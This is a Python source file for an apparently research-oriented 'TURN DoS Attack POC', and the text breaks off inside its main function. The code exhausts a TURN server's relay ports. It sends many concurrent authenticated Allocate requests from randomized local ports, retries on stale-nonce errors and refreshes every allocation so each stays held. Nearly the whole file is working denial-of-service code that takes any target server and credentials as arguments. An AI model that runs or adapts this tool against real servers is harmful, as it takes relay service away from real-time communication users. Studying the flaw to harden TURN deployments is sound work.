#!/usr/bin/env python3
"""
TURN DoS Attack POC - Attack 1: Send n allocation requests in a short time to exhaust all available relay ports
"""

import socket
import struct
import time
import argparse
import sys
import os
import threading
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
TURN_UTILS_DIR = os.path.join(CURRENT_DIR, "turn_utils")

for path in (CURRENT_DIR, TURN_UTILS_DIR):
    if path not in sys.path:
        sys.path.insert(0, path)

from turn_utils.test_turn_capabilities import allocate_with_fallback
from turn_utils.turn_client import (
    STUN_ATTR_USERNAME,
    STUN_ATTR_REALM,
    STUN_ATTR_NONCE,
    STUN_ATTR_MESSAGE_INTEGRITY,
    STUN_ATTR_FINGERPRINT,
    STUN_MAGIC_COOKIE,
    resolve_server_address
)
# 直接从turn_client导入这些函数
import turn_utils.turn_client as turn_client
gen_tid = turn_client.gen_tid
stun_attr = turn_client.stun_attr
build_msg = turn_client.build_msg
parse_attrs = turn_client.parse_attrs
from config import DEFAULT_TURN_SERVER, DEFAULT_TURN_PORT

# STUN/TURN Refresh 常量（RFC 8656）
STUN_REFRESH_REQUEST = 0x0004
STUN_REFRESH_SUCCESS_RESPONSE = 0x0104
STUN_REFRESH_ERROR_RESPONSE = 0x0114
STUN_ATTR_ERROR_CODE = 0x0009
STUN_ATTR_LIFETIME = 0x000D  # RFC 8656 Section 18.2
STUN_ATTR_XOR_RELAYED_ADDRESS = 0x0016  # RFC 8656 Section 18.5

# 全局统计
stats = {
    'total_requests': 0,
    'successful_allocations': 0,
    'failed_allocations': 0,
    'active_allocations': 0,
    'errors': defaultdict(int),
    'error_486_count': 0,  # 486错误计数
    'consecutive_failures': 0,  # 连续失败计数
}
stats_lock = threading.Lock()

# 控制是否继续allocate
should_continue_allocating = True
should_continue_lock = threading.Lock()

# 全局停止标志（用于停止所有refresh线程）
stop_all_refresh = threading.Event()

# 存储活跃的allocation
active_allocations = []
allocations_lock = threading.Lock()

# 存储已申请的中继端口号（用于检测重复）
allocated_relayed_ports = set()  # {(relayed_ip, relayed_port)}
relayed_ports_lock = threading.Lock()
relayed_port_duplicates = []  # 记录重复的中继端口号

# 端口管理（1024-49151）
port_pool = list(range(1024, 49152))  # 1024-49151
random.shuffle(port_pool)  # 随机打乱
used_ports = set()
ports_lock = threading.Lock()
port_index = 0  # 当前遍历索引，避免总是从头开始

def get_next_port():
    """获取下一个可用端口（随机选择，避免重复使用刚释放的端口）"""
    global port_index
    with ports_lock:
        # 获取所有可用端口
        available_ports = [p for p in port_pool if p not in used_ports]
        if not available_ports:
            return None  # 端口池用尽
        
        # 随机选择一个可用端口，避免总是选择同一个
        port = random.choice(available_ports)
        used_ports.add(port)
        return port

def get_port_stats():
    """获取端口使用统计（用于调试）"""
    with ports_lock:
        return {
            'total_ports': len(port_pool),
            'used_ports': len(used_ports),
            'available_ports': len(port_pool) - len(used_ports)
        }

def release_port(port):
    """释放端口"""
    with ports_lock:
        used_ports.discard(port)

def refresh_allocation(sock, nonce, realm, integrity_key, server_address, username=None, password=None, lifetime=None, mi_algorithm=None):
    """
    刷新TURN分配
    
    Returns:
        (success, lifetime_value, nonce, realm, integrity_key) 或
        (False, None, nonce, realm, integrity_key)
    """
    from turn_utils.turn_client import (
        build_msg_with_short_term_credential,
        build_msg_with_short_term_credential_sha256_only,
        build_msg_with_short_term_credential_sha1_only,
        compute_long_term_hmac_key,
        USERNAME,
        PASSWORD
    )
    
    auth_username = username or USERNAME
    auth_password = password or PASSWORD
    
    def build_refresh_request(current_nonce, current_realm, current_integrity_key):
        tid = gen_tid()
        attrs = [
            stun_attr(STUN_ATTR_USERNAME, auth_username.encode()),
        ]
        
        if current_realm is not None:
            attrs.append(stun_attr(STUN_ATTR_REALM, current_realm))
        if current_nonce is not None:
            attrs.append(stun_attr(STUN_ATTR_NONCE, current_nonce))
        
        if lifetime is not None:
            attrs.append(stun_attr(STUN_ATTR_LIFETIME, struct.pack("!I", lifetime)))
        
        if current_nonce is None and current_realm is None:
            if mi_algorithm == 'sha256':
                return build_msg_with_short_term_credential_sha256_only(STUN_REFRESH_REQUEST, tid, attrs, current_integrity_key, add_fingerprint=True)
            elif mi_algorithm == 'sha1':
                return build_msg_with_short_term_credential_sha1_only(STUN_REFRESH_REQUEST, tid, attrs, current_integrity_key, add_fingerprint=True)
            else:
                return build_msg_with_short_term_credential(STUN_REFRESH_REQUEST, tid, attrs, current_integrity_key, add_fingerprint=True)
        return build_msg(STUN_REFRESH_REQUEST, tid, attrs, current_integrity_key, add_fingerprint=True)
    
    is_tcp_socket = False
    if hasattr(sock, '_sslobj') or sock.__class__.__name__ == 'SSLSocket':
        is_tcp_socket = True
    elif hasattr(sock, 'type'):
        try:
            sock_type = sock.type
            if (sock_type == socket.SOCK_STREAM or 
                (hasattr(sock_type, 'value') and getattr(sock_type, 'value', None) == 1) or
                int(sock_type) == 1):
                is_tcp_socket = True
        except (ValueError, TypeError, AttributeError):
            pass
    
    if not is_tcp_socket:
        try:
            sock.getpeername()
            is_tcp_socket = True
        except (AttributeError, OSError, socket.error):
            pass
    
    def send_refresh_request(req):
        if is_tcp_socket:
            sock.send(req)
            sock.settimeout(10)
            return sock.recv(2000)
        else:
            sock.sendto(req, server_address)
            sock.settimeout(10)
            data, _ = sock.recvfrom(2000)
            return data
    
    try:
        req = build_refresh_request(nonce, realm, integrity_key)
        data = send_refresh_request(req)
        
        msg_type, tid, attrs = parse_attrs(data)
        
        if msg_type == STUN_REFRESH_SUCCESS_RESPONSE:
            lifetime_value = None
            if STUN_ATTR_LIFETIME in attrs:
                lifetime_value = struct.unpack("!I", attrs[STUN_ATTR_LIFETIME])[0]
            return True, lifetime_value, nonce, realm, integrity_key
        elif msg_type == STUN_REFRESH_ERROR_RESPONSE:
            # 打印错误信息
            error_code_attr = attrs.get(STUN_ATTR_ERROR_CODE)
            if error_code_attr and len(error_code_attr) >= 4:
                error_class = error_code_attr[2]
                error_number = error_code_attr[3]
                error_text = error_code_attr[4:].decode('utf-8', errors='ignore') if len(error_code_attr) > 4 else ''
                error_code_value = error_class * 100 + error_number
                
                # 获取socket信息用于调试
                try:
                    sockname = sock.getsockname()
                    sock_info = f"local {sockname[0]}:{sockname[1]}"
                except:
                    sock_info = "unknown socket"
                
                print(f"[-] Refresh failed ({sock_info}): {error_class}{error_number:02d} {error_text}")
                
                # RFC 8656 Section 8.3 / RFC 8489 Section 9.2.5:
                # Refresh 收到 438 后必须使用响应中的新 NONCE 重试。
                if error_code_value == 438:
                    new_nonce = attrs.get(STUN_ATTR_NONCE)
                    new_realm = attrs.get(STUN_ATTR_REALM) or realm
                    
                    if new_nonce and new_realm and (nonce is not None or realm is not None):
                        print(f"[+] Refresh received 438 Stale Nonce, retrying with new nonce")
                        new_integrity_key = integrity_key
                        if new_realm != realm:
                            new_integrity_key = compute_long_term_hmac_key(auth_username, new_realm, auth_password)
                        
                        retry_req = build_refresh_request(new_nonce, new_realm, new_integrity_key)
                        retry_data = send_refresh_request(retry_req)
                        retry_msg_type, retry_tid, retry_attrs = parse_attrs(retry_data)
                        
                        if retry_msg_type == STUN_REFRESH_SUCCESS_RESPONSE:
                            lifetime_value = None
                            if STUN_ATTR_LIFETIME in retry_attrs:
                                lifetime_value = struct.unpack("!I", retry_attrs[STUN_ATTR_LIFETIME])[0]
                            return True, lifetime_value, new_nonce, new_realm, new_integrity_key
                        elif retry_msg_type == STUN_REFRESH_ERROR_RESPONSE:
                            retry_error_code_attr = retry_attrs.get(STUN_ATTR_ERROR_CODE)
                            if retry_error_code_attr and len(retry_error_code_attr) >= 4:
                                retry_error_class = retry_error_code_attr[2]
                                retry_error_number = retry_error_code_attr[3]
                                retry_error_text = retry_error_code_attr[4:].decode('utf-8', errors='ignore') if len(retry_error_code_attr) > 4 else ''
                                print(f"[-] Refresh retry failed ({sock_info}): {retry_error_class}{retry_error_number:02d} {retry_error_text}")
                            else:
                                print(f"[-] Refresh retry failed ({sock_info}): Unknown error")
                        else:
                            print(f"[-] Refresh retry failed ({sock_info}): Unexpected response type 0x{retry_msg_type:04x}")
                    else:
                        print(f"[-] Refresh received 438 Stale Nonce but response did not include usable NONCE/REALM")
                
                # 437错误表示allocation不匹配，可能allocation已过期或被删除
                if error_code_value == 437:
                    print(f"[-] 437 Allocation Mismatch: The allocation may have expired or been deleted. "
                          f"5-tuple mismatch or allocation no longer exists.")
            else:
                try:
                    sockname = sock.getsockname()
                    sock_info = f"local {sockname[0]}:{sockname[1]}"
                except:
                    sock_info = "unknown socket"
                print(f"[-] Refresh failed ({sock_info}): Unknown error")
            return False, None, nonce, realm, integrity_key
        else:
            try:
                sockname = sock.getsockname()
                sock_info = f"local {sockname[0]}:{sockname[1]}"
            except:
                sock_info = "unknown socket"
            print(f"[-] Refresh failed ({sock_info}): Unexpected response type 0x{msg_type:04x}")
            return False, None, nonce, realm, integrity_key
    except (socket.timeout, Exception):
        return False, None, nonce, realm, integrity_key

def keep_allocation_alive(allocation_info, server_address, username, refresh_interval=300, password=None):
    """
    保持allocation活跃，定期发送refresh请求
    
    注意：使用allocation时创建的同一个socket，确保使用相同的本地端口（5-tuple一致性）
    
    Args:
        allocation_info: (sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm, local_port)
        server_address: TURN服务器地址
        username: 用户名
        refresh_interval: refresh间隔（秒）
    """
    sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm, local_port = allocation_info
    
    # 验证socket的本地端口（用于调试）
    try:
        sockname = sock.getsockname()
        if sockname[1] != local_port:
            print(f"[!] Warning: Socket port mismatch! Expected {local_port}, got {sockname[1]}")
    except:
        pass
    
    try:
        while not stop_all_refresh.is_set():
            # 使用wait而不是sleep，这样可以响应停止信号
            if stop_all_refresh.wait(timeout=refresh_interval):
                # 收到停止信号
                break
            
            # 使用同一个socket发送refresh，确保5-tuple一致
            success, lifetime, new_nonce, new_realm, new_integrity_key = refresh_allocation(
                sock, nonce, realm, integrity_key,
                server_address, username,
                password=password,
                mi_algorithm=mi_algorithm
            )
            if not success:
                # refresh失败，从活跃列表中移除
                with allocations_lock:
                    if allocation_info in active_allocations:
                        active_allocations.remove(allocation_info)
                with stats_lock:
                    stats['active_allocations'] = len(active_allocations)
                sock.close()
                # 释放端口
                if local_port is not None:
                    release_port(local_port)
                break
            
            nonce = new_nonce
            realm = new_realm
            integrity_key = new_integrity_key
    except KeyboardInterrupt:
        # 忽略KeyboardInterrupt，让主线程处理
        pass
    except Exception as e:
        # 发生异常，从活跃列表中移除
        with allocations_lock:
            if allocation_info in active_allocations:
                active_allocations.remove(allocation_info)
        with stats_lock:
            stats['active_allocations'] = len(active_allocations)
        try:
            sock.close()
        except:
            pass
        # 释放端口
        if local_port is not None:
            release_port(local_port)
    finally:
        # 确保socket关闭和端口释放
        try:
            sock.close()
        except:
            pass
        if local_port is not None:
            release_port(local_port)

def allocate_with_local_port(server_address, username, password, realm, local_port, use_short_term_credential=False):
    """
    使用指定本地端口的allocation函数
    
    Args:
        server_address: TURN服务器地址
        username: 用户名
        password: 密码
        realm: 认证域
        local_port: 本地端口号
        use_short_term_credential: 是否使用短期凭证
    
    Returns:
        与allocate_single_server相同的返回值
    """
    from turn_utils.turn_client import (
        allocate_single_server, build_msg, stun_attr, gen_tid, parse_attrs,
        STUN_ALLOCATE_REQUEST, STUN_ALLOCATE_ERROR_RESPONSE, STUN_ALLOCATE_SUCCESS_RESPONSE,
        STUN_ATTR_REQUESTED_TRANSPORT, STUN_ATTR_USERNAME, STUN_ATTR_REALM, STUN_ATTR_NONCE,
        STUN_ATTR_ERROR_CODE, STUN_ATTR_MESSAGE_INTEGRITY, STUN_ATTR_MESSAGE_INTEGRITY_SHA256,
        STUN_MAGIC_COOKIE, compute_long_term_hmac_key, build_msg_with_short_term_credential,
        build_msg_with_short_term_credential_sha256_only, build_msg_with_short_term_credential_sha1_only,
        verify_short_term_response_integrity, opaque_string, USERNAME, PASSWORD
    )
    
    auth_username = username or USERNAME
    auth_password = password or PASSWORD
    
    # 创建socket并绑定到指定端口
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    
    try:
        # 绑定到指定本地端口
        # 注意：如果bind失败，说明端口可能被系统占用，这不是我们的端口管理问题
        # 但为了确保不重复，端口已经在get_next_port()中被标记为已使用
        sock.bind(('0.0.0.0', local_port))
    except OSError as e:
        # bind失败通常是因为端口被系统或其他程序占用
        # 我们不释放端口，因为：
        # 1. 如果释放，另一个线程可能会再次获取它，导致bind再次失败
        # 2. 端口仍然在used_ports中，不会导致重复使用
        # 3. 虽然可能导致端口"浪费"，但不会导致重复使用
        print(f"[-] Failed to bind to port {local_port}: {e} (port may be system-allocated, will not reuse)")
        sock.close()
        return None
    
    try:
        if use_short_term_credential:
            # 短期凭证
            integrity_key = opaque_string(auth_password)
            attrs = [
                stun_attr(STUN_ATTR_USERNAME, auth_username.encode()),
                stun_attr(STUN_ATTR_REQUESTED_TRANSPORT, struct.pack("!B3s", 17, b"\x00\x00\x00")),
            ]
            tid = gen_tid()
            req = build_msg_with_short_term_credential(STUN_ALLOCATE_REQUEST, tid, attrs, integrity_key, add_fingerprint=True)
            sock.sendto(req, server_address)
            
            try:
                data, _ = sock.recvfrom(2000)
                msg_type, tid, resp_attrs = parse_attrs(data)
            except socket.timeout:
                print(f"[-] Allocation failed (local port: {local_port}): Timeout waiting for response")
                sock.close()
                return None
            
            if msg_type == STUN_ALLOCATE_SUCCESS_RESPONSE:
                # 检测算法类型
                has_sha256 = STUN_ATTR_MESSAGE_INTEGRITY_SHA256 in resp_attrs
                has_sha1 = STUN_ATTR_MESSAGE_INTEGRITY in resp_attrs
                if has_sha256:
                    mi_algorithm = 'sha256'
                elif has_sha1:
                    mi_algorithm = 'sha1'
                else:
                    mi_algorithm = 'both'
                
                # 验证完整性
                is_valid, verified_algorithm = verify_short_term_response_integrity(data, integrity_key, expected_algorithm='both')
                if not is_valid:
                    print(f"[-] Allocation failed: Response integrity verification failed (local port: {local_port})")
                    sock.close()
                    return None
                
                if verified_algorithm and verified_algorithm != mi_algorithm:
                    mi_algorithm = verified_algorithm
                
                # 解析中继端口号并检测重复
                relayed_addr = resp_attrs.get(STUN_ATTR_XOR_RELAYED_ADDRESS)
                if relayed_addr and len(relayed_addr) >= 8:
                    # XOR解码中继地址
                    family = relayed_addr[1]  # 第1字节是地址族
                    port_xor = struct.unpack("!H", relayed_addr[2:4])[0]
                    relayed_port = port_xor ^ (STUN_MAGIC_COOKIE >> 16)
                    ip_bytes = relayed_addr[4:8]
                    ip_xor = struct.unpack("!I", ip_bytes)[0]
                    ip_int = ip_xor ^ STUN_MAGIC_COOKIE
                    relayed_ip = socket.inet_ntoa(struct.pack("!I", ip_int))
                    
                    # 检查是否重复
                    relayed_key = (relayed_ip, relayed_port)
                    with relayed_ports_lock:
                        if relayed_key in allocated_relayed_ports:
                            print(f"[!] WARNING: Duplicate relayed port detected! Local port: {local_port}, Relayed: {relayed_ip}:{relayed_port}")
                            relayed_port_duplicates.append({
                                'local_port': local_port,
                                'relayed_ip': relayed_ip,
                                'relayed_port': relayed_port,
                                'timestamp': time.time()
                            })
                        else:
                            allocated_relayed_ports.add(relayed_key)
                
                return sock, None, None, integrity_key, server_address, mi_algorithm
            elif msg_type == STUN_ALLOCATE_ERROR_RESPONSE:
                # 打印错误信息
                error_code_attr = resp_attrs.get(STUN_ATTR_ERROR_CODE)
                if error_code_attr and len(error_code_attr) >= 4:
                    error_class = error_code_attr[2]
                    error_number = error_code_attr[3]
                    error_text = error_code_attr[4:].decode('utf-8', errors='ignore') if len(error_code_attr) > 4 else ''
                    print(f"[-] Allocation failed (local port: {local_port}): {error_class}{error_number:02d} {error_text}")
                else:
                    print(f"[-] Allocation failed (local port: {local_port}): Unknown error")
                sock.close()
                return None
            else:
                print(f"[-] Allocation failed (local port: {local_port}): Unexpected response type 0x{msg_type:04x}")
                sock.close()
                return None
        else:
            # 长期凭证：先发送无认证请求获取nonce和realm
            tid1 = gen_tid()
            req1 = build_msg(STUN_ALLOCATE_REQUEST, tid1, [
                stun_attr(STUN_ATTR_REQUESTED_TRANSPORT, struct.pack("!B3s", 17, b"\x00\x00\x00"))
            ])
            sock.sendto(req1, server_address)
            
            try:
                data, _ = sock.recvfrom(2000)
                msg_type, tid, attrs = parse_attrs(data)
            except socket.timeout:
                print(f"[-] Allocation failed (local port: {local_port}): Timeout waiting for first response")
                sock.close()
                return None
            
            if msg_type != STUN_ALLOCATE_ERROR_RESPONSE:
                print(f"[-] Allocation failed (local port: {local_port}): Expected 401 error, got 0x{msg_type:04x}")
                sock.close()
                return None
            
            error_code = attrs.get(STUN_ATTR_ERROR_CODE)
            if error_code and len(error_code) >= 4:
                error_class = error_code[2]
                error_number = error_code[3]
                if error_class == 4 and error_number == 1:  # 401 Unauthorized
                    nonce = attrs.get(STUN_ATTR_NONCE)
                    server_realm = attrs.get(STUN_ATTR_REALM)
                    if nonce and server_realm:
                        # 发送带认证的请求
                        tid2 = gen_tid()
                        integrity_key = compute_long_term_hmac_key(auth_username, server_realm, auth_password)
                        attrs2 = [
                            stun_attr(STUN_ATTR_USERNAME, auth_username.encode()),
                            stun_attr(STUN_ATTR_REALM, server_realm),
                            stun_attr(STUN_ATTR_NONCE, nonce),
                            stun_attr(STUN_ATTR_REQUESTED_TRANSPORT, struct.pack("!B3s", 17, b"\x00\x00\x00")),
                        ]
                        req2 = build_msg(STUN_ALLOCATE_REQUEST, tid2, attrs2, integrity_key, add_fingerprint=True)
                        sock.sendto(req2, server_address)
                        
                        try:
                            data2, _ = sock.recvfrom(2000)
                            msg_type2, tid2, attrs2 = parse_attrs(data2)
                        except socket.timeout:
                            print(f"[-] Allocation failed (local port: {local_port}): Timeout waiting for authenticated response")
                            sock.close()
                            return None
                        
                        # 检测算法类型
                        mi_algorithm = None
                        if msg_type2 == STUN_ALLOCATE_SUCCESS_RESPONSE:
                            if STUN_ATTR_MESSAGE_INTEGRITY_SHA256 in attrs2:
                                mi_algorithm = 'sha256'
                            elif STUN_ATTR_MESSAGE_INTEGRITY in attrs2:
                                mi_algorithm = 'sha1'
                            
                            # 解析中继端口号并检测重复
                            relayed_addr = attrs2.get(STUN_ATTR_XOR_RELAYED_ADDRESS)
                            if relayed_addr and len(relayed_addr) >= 8:
                                # XOR解码中继地址
                                family = relayed_addr[1]  # 第1字节是地址族
                                port_xor = struct.unpack("!H", relayed_addr[2:4])[0]
                                relayed_port = port_xor ^ (STUN_MAGIC_COOKIE >> 16)
                                ip_bytes = relayed_addr[4:8]
                                ip_xor = struct.unpack("!I", ip_bytes)[0]
                                ip_int = ip_xor ^ STUN_MAGIC_COOKIE
                                relayed_ip = socket.inet_ntoa(struct.pack("!I", ip_int))
                                
                                # 检查是否重复
                                relayed_key = (relayed_ip, relayed_port)
                                with relayed_ports_lock:
                                    if relayed_key in allocated_relayed_ports:
                                        print(f"[!] WARNING: Duplicate relayed port detected! Local port: {local_port}, Relayed: {relayed_ip}:{relayed_port}")
                                        relayed_port_duplicates.append({
                                            'local_port': local_port,
                                            'relayed_ip': relayed_ip,
                                            'relayed_port': relayed_port,
                                            'timestamp': time.time()
                                        })
                                    else:
                                        allocated_relayed_ports.add(relayed_key)
                            
                            return sock, nonce, server_realm, integrity_key, server_address, mi_algorithm
                        elif msg_type2 == STUN_ALLOCATE_ERROR_RESPONSE:
                            # 检查是否是438 Stale Nonce
                            error_code2 = attrs2.get(STUN_ATTR_ERROR_CODE)
                            if error_code2 and len(error_code2) >= 4:
                                error_class2 = error_code2[2]
                                error_number2 = error_code2[3]
                                error_text2 = error_code2[4:].decode('utf-8', errors='ignore') if len(error_code2) > 4 else ''
                                if error_class2 == 4 and error_number2 == 38:  # 438 Stale Nonce
                                        # 使用新的nonce重试
                                        new_nonce = attrs2.get(STUN_ATTR_NONCE)
                                        new_realm = attrs2.get(STUN_ATTR_REALM)
                                        if new_nonce and new_realm:
                                            tid3 = gen_tid()
                                            integrity_key = compute_long_term_hmac_key(auth_username, new_realm, auth_password)
                                            attrs3 = [
                                                stun_attr(STUN_ATTR_USERNAME, auth_username.encode()),
                                                stun_attr(STUN_ATTR_REALM, new_realm),
                                                stun_attr(STUN_ATTR_NONCE, new_nonce),
                                                stun_attr(STUN_ATTR_REQUESTED_TRANSPORT, struct.pack("!B3s", 17, b"\x00\x00\x00")),
                                            ]
                                            req3 = build_msg(STUN_ALLOCATE_REQUEST, tid3, attrs3, integrity_key, add_fingerprint=True)
                                            sock.sendto(req3, server_address)
                                            
                                            try:
                                                data3, _ = sock.recvfrom(2000)
                                                msg_type3, tid3, attrs3 = parse_attrs(data3)
                                            except socket.timeout:
                                                print(f"[-] Allocation failed (local port: {local_port}): Timeout waiting for retry response")
                                                sock.close()
                                                return None
                                            
                                            if msg_type3 == STUN_ALLOCATE_SUCCESS_RESPONSE:
                                                if STUN_ATTR_MESSAGE_INTEGRITY_SHA256 in attrs3:
                                                    mi_algorithm = 'sha256'
                                                elif STUN_ATTR_MESSAGE_INTEGRITY in attrs3:
                                                    mi_algorithm = 'sha1'
                                                
                                                # 解析中继端口号并检测重复
                                                relayed_addr = attrs3.get(STUN_ATTR_XOR_RELAYED_ADDRESS)
                                                if relayed_addr and len(relayed_addr) >= 8:
                                                    # XOR解码中继地址
                                                    family = relayed_addr[1]  # 第1字节是地址族
                                                    port_xor = struct.unpack("!H", relayed_addr[2:4])[0]
                                                    relayed_port = port_xor ^ (STUN_MAGIC_COOKIE >> 16)
                                                    ip_bytes = relayed_addr[4:8]
                                                    ip_xor = struct.unpack("!I", ip_bytes)[0]
                                                    ip_int = ip_xor ^ STUN_MAGIC_COOKIE
                                                    relayed_ip = socket.inet_ntoa(struct.pack("!I", ip_int))
                                                    
                                                    # 检查是否重复
                                                    relayed_key = (relayed_ip, relayed_port)
                                                    with relayed_ports_lock:
                                                        if relayed_key in allocated_relayed_ports:
                                                            print(f"[!] WARNING: Duplicate relayed port detected! Local port: {local_port}, Relayed: {relayed_ip}:{relayed_port}")
                                                            relayed_port_duplicates.append({
                                                                'local_port': local_port,
                                                                'relayed_ip': relayed_ip,
                                                                'relayed_port': relayed_port,
                                                                'timestamp': time.time()
                                                            })
                                                        else:
                                                            allocated_relayed_ports.add(relayed_key)
                                                
                                                return sock, new_nonce, new_realm, integrity_key, server_address, mi_algorithm
                                            else:
                                                error_code3 = attrs3.get(STUN_ATTR_ERROR_CODE)
                                                if error_code3 and len(error_code3) >= 4:
                                                    error_class3 = error_code3[2]
                                                    error_number3 = error_code3[3]
                                                    error_text3 = error_code3[4:].decode('utf-8', errors='ignore') if len(error_code3) > 4 else ''
                                                    print(f"[-] Allocation failed (local port: {local_port}): {error_class3}{error_number3:02d} {error_text3} (after retry)")
                                                else:
                                                    print(f"[-] Allocation failed (local port: {local_port}): Unknown error (after retry)")
                                else:
                                    print(f"[-] Allocation failed (local port: {local_port}): {error_class2}{error_number2:02d} {error_text2}")
                            else:
                                print(f"[-] Allocation failed (local port: {local_port}): Unknown error in authenticated response")
                        else:
                            print(f"[-] Allocation failed (local port: {local_port}): Unexpected response type 0x{msg_type2:04x}")
            
            sock.close()
            return None
    except Exception as e:
        print(f"[-] Allocation error (local port: {local_port}): {e}")
        import traceback
        traceback.print_exc()
        sock.close()
        return None

def attempt_allocation(server_address, username, password, realm, server_hostname, allocation_id):
    """
    尝试单个allocation请求，检测486错误，使用端口管理
    
    Returns:
        (success, allocation_info, error_code) 
        success: True/False
        allocation_info: 成功时的allocation信息，失败时为None
        error_code: 错误码（如486），成功时为None
    """
    local_port = None
    try:
        with stats_lock:
            stats['total_requests'] += 1
        
        # 获取下一个可用端口
        local_port = get_next_port()
        if local_port is None:
            print(f"[-] Allocation #{allocation_id}: No available ports")
            return False, None, None
        
        # 使用指定端口进行allocation
        # 先尝试长期凭证
        result = allocate_with_local_port(server_address, username, password, realm, local_port, use_short_term_credential=False)
        
        # 如果失败，尝试短期凭证
        if not result:
            result = allocate_with_local_port(server_address, username, password, realm, local_port, use_short_term_credential=True)
        
        if result:
            sock, nonce, realm, integrity_key, actual_server_address, *extra = result
            mi_algorithm = extra[0] if extra else None
            allocation_info = (sock, nonce, realm, integrity_key, actual_server_address, mi_algorithm, local_port)
            
            with allocations_lock:
                active_allocations.append(allocation_info)
            
            with stats_lock:
                stats['successful_allocations'] += 1
                stats['active_allocations'] = len(active_allocations)
                # 成功时重置连续失败计数
                stats['consecutive_failures'] = 0
            
            print(f"[+] Allocation #{allocation_id} successful (Local port: {local_port}, Total: {stats['successful_allocations']}/{stats['total_requests']})")
            return True, allocation_info, None
        else:
            # allocation失败，需要检查错误码
            # 释放端口（但先检查是否是486错误）
            # 需要检查错误码，但allocate_with_local_port不返回错误码
            # 我们需要重新发送请求来检查错误码
            import socket
            from turn_utils.turn_client import build_msg, stun_attr, gen_tid, STUN_ALLOCATE_REQUEST, parse_attrs, STUN_ATTR_REQUESTED_TRANSPORT
            
            check_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            check_sock.settimeout(3)
            try:
                # 发送一个简单的请求来检查错误码
                tid = gen_tid()
                req = build_msg(STUN_ALLOCATE_REQUEST, tid, [
                    stun_attr(STUN_ATTR_REQUESTED_TRANSPORT, struct.pack("!B3s", 17, b"\x00\x00\x00"))
                ])
                check_sock.sendto(req, server_address)
                data, _ = check_sock.recvfrom(2000)
                msg_type, tid, attrs = parse_attrs(data)
                
                if msg_type == STUN_ALLOCATE_ERROR_RESPONSE:
                    error_code = attrs.get(STUN_ATTR_ERROR_CODE)
                    if error_code and len(error_code) >= 4:
                        error_class = error_code[2]
                        error_number = error_code[3]
                        error_code_value = error_class * 100 + error_number
                        
                        if error_code_value == 486:  # Allocation Quota Reached
                            with stats_lock:
                                stats['error_486_count'] += 1
                                # 增加连续失败计数
                                stats['consecutive_failures'] += 1
                            print(f"[-] Allocation #{allocation_id} failed: 486 Allocation Quota Reached (Total 486: {stats['error_486_count']}, Consecutive failures: {stats['consecutive_failures']})")
                            check_sock.close()
                            # 释放端口
                            if local_port is not None:
                                release_port(local_port)
                            return False, None, 486
            except:
                pass
            finally:
                check_sock.close()
            
            # allocation失败，释放端口
            if local_port is not None:
                release_port(local_port)
            
            with stats_lock:
                stats['failed_allocations'] += 1
                stats['errors']['allocation_failed'] += 1
                # 增加连续失败计数
                stats['consecutive_failures'] += 1
            
            print(f"[-] Allocation #{allocation_id} failed (local port: {local_port}, Total: {stats['failed_allocations']}/{stats['total_requests']}, Consecutive failures: {stats['consecutive_failures']})")
            return False, None, None
    
    except Exception as e:
        error_msg = str(e)
        with stats_lock:
            stats['failed_allocations'] += 1
            stats['errors'][error_msg] += 1
            # 增加连续失败计数
            stats['consecutive_failures'] += 1
        
        # 确保在异常情况下也释放端口
        if local_port is not None:
            release_port(local_port)
        
        print(f"[-] Allocation #{allocation_id} error: {error_msg} (Consecutive failures: {stats['consecutive_failures']})")
        return False, None, None

def print_stats():
    """Print statistics"""
    with stats_lock:
        print("\n" + "="*70)
        print("📊 Attack Statistics")
        print("="*70)
        print(f"Total Requests: {stats['total_requests']}")
        print(f"Successful Allocations: {stats['successful_allocations']}")
        print(f"Failed Allocations: {stats['failed_allocations']}")
        print(f"Active Allocations: {stats['active_allocations']}")
        if stats['errors']:
            print("\nError Statistics:")
            for error, count in stats['errors'].items():
                print(f"  {error}: {count}")
    
    # Print relay port statistics
    with relayed_ports_lock:
        print(f"\nRelayed Port Statistics:")
        print(f"  Unique Relayed Ports: {len(allocated_relayed_ports)}")
        print(f"  Duplicate Relayed Ports: {len(relayed_port_duplicates)}")
        if relayed_port_duplicates:
            print(f"\nDuplicate Relayed Port Details (Last 10):")
            for dup in relayed_port_duplicates[-10:]:  # Only show last 10
                print(f"  Local port: {dup['local_port']}, Relayed: {dup['relayed_ip']}:{dup['relayed_port']}")
    
    print("="*70 + "\n")

def main():
    parser = argparse.ArgumentParser(description='TURN DoS Attack POC - Attack 1: Continuously exhaust all available relay ports')
    parser.add_argument('--turn-server', required=True, help='TURN server address (hostname or IP)')
    parser.add_argument('--turn-port', type=int, help='TURN server port')
    parser.add_argument('--username', required=True, help='TURN server username')
    parser.add_argument('--password', required=True, help='TURN server password')
    parser.add_argument('--realm', help='TURN server authentication realm')
    parser.add_argument('--concurrent', type=int, default=10, help='Concurrent requests (default: 10)')
    parser.add_argument('--refresh-interval', type=int, default=300, help='Refresh interval (seconds, default: 300)')
    parser.add_argument('--monitor-interval', type=int, default=5, help='Statistics print interval (seconds, default: 5)')
    parser.add_argument('--failure-threshold', dest='failure_threshold', type=int, default=100, help='Failure threshold, stop new allocations when exceeded (default: 100)')
    
    args = parser.parse_args()
    
    print("="*70)
    print("🚨 TURN DoS Attack POC - Attack 1 (Continuous Mode)")
    print("="*70)
    
    # Resolve TURN server address
    server_address = resolve_server_address(args.turn_server, args.turn_port or DEFAULT_TURN_PORT)
    if not server_address:
        print("[-] Failed to resolve TURN server address")
        return
    
    print(f"[+] TURN Server: {server_address}")
    print(f"[+] Username: {args.username}")
    print(f"[+] Concurrent: {args.concurrent}")
    print(f"[+] Refresh Interval: {args.refresh_interval} seconds")
    print(f"[+] Failure Threshold: {args.failure_threshold} (stop new allocations after {args.failure_threshold} consecutive failures)")
    print(f"[+] Mode: Continue allocating until {args.failure_threshold} consecutive failures, then continue refreshing")
    print()
    
    # 启动统计信息监控线程
    stop_monitoring = threading.Event()
    
    def monitor_stats():
        while not stop_monitoring.is_set():
            time.sleep(args.monitor_interval)
            print_stats()
    
    monitor_thread = threading.Thread(target=monitor_stats, daemon=True)
    monitor_thread.start()
    
    # 启动keep-alive线程池（总是启用）
